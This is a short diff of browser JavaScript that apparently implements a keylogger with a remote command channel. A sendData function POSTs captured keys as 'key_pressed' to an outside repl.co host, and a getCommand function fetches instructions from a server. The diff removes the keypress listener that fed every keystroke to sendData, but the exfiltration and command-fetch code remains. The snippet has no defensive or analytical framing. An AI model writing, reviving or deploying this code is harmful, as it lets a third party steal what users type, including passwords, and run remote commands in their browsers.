@@ -1,12 +1,10 @@
 // Some useless comment
 
 const sendData = async (data) => {
-    const url = (new URL(window.location.href));
     await fetch(`https://draco.maalolan.repl.co/`, {
         method: 'POST', // or 'PUT'
         headers: {
             'Accept': 'application/json',
-            // 'Access-Control-Allow-Origin': url.hostname,
             'Content-Type': 'application/json',
         },
         body: JSON.stringify({ key_pressed: data }),
@@ -28,10 +26,5 @@ const getCommand = async () => {
         })
         .catch(err => console.log(err))
 }
-
-
-document.addEventListener("keypress", async (event) => {
-    await sendData(event.key)
-})
 
 getCommand()
